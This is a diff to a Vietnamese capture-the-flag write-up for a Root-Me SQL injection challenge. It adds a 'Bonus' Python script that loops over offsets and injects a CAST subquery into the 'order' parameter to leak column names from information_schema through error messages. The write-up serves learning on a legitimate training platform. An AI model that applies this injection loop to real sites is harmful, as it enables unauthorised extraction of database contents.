@@ -106,7 +106,24 @@ May là offset ở vị trí 1 và 2 `us3rn4m3_c0l` và `p455w0rd_c0l`.Bây gi�
 
 ![image](https://user-images.githubusercontent.com/115911041/234288968-48b0f50d-5b60-43f4-a1cd-076c9315b625.png)
 
+*Bonus:
 
+Khi mà các bạn tìm được `table_name` á, thay vì ta sẽ chạy offset để tìm `column_name` bằng burp intruder ta có thể coding một chút 
 
+```
+import requests
+import sys
 
+URL='http://challenge01.root-me.org/web-serveur/ch34/'
+for i in range(0, 1001):
+    query = 'ASC, (CAST((select column_name from information_schema.columns limit 1 offset ' + str(i) + ') as int))--'
+    params = {'action': 'contents', 'order': query}
+    http = requests.get(url= URL, params =params)
+    content = http.content.decode("utf-8")
+    print(content[400:])
+```    
 
+OUTPUT:
+![image](https://user-images.githubusercontent.com/115911041/234318522-d10ca3c5-04e4-414c-986b-548e6b8e83c8.png)
+
+Tới chỗ này thì làm bth thôi. Màu màu chút í mà :))))))
